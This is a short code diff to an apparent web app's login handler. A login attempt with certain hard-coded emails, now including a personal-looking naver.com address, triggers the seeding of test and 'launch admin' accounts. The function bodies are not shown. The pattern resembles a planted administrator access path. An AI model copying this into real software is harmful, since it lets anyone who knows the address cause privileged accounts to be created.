@@ -91,6 +91,7 @@ from ..models import (
     MinorAccessBlockLog,
 )
 from ..services.realtime import thread_connection_manager
+from ..seed_db import ensure_launch_admin_accounts, ensure_test_accounts
 
 from ..schemas import (
     AppReviewSettings,
@@ -2354,9 +2355,10 @@ def login(payload: LoginRequest, request: Request, session: Session = Depends(ge
     except Exception:
         session.rollback()
         logger.exception("auth_login_rate_limit_failed")
-    if payload.email in {"admin@example.com", "seller@example.com", "customer@example.com", "general@example.com"}:
+    if payload.email in {"admin@example.com", "seller@example.com", "customer@example.com", "general@example.com", "aksqhqkqh3@naver.com"}:
         try:
             ensure_test_accounts(session)
+            ensure_launch_admin_accounts(session)
         except Exception:
             session.rollback()
             logger.exception("ensure_test_accounts_failed")
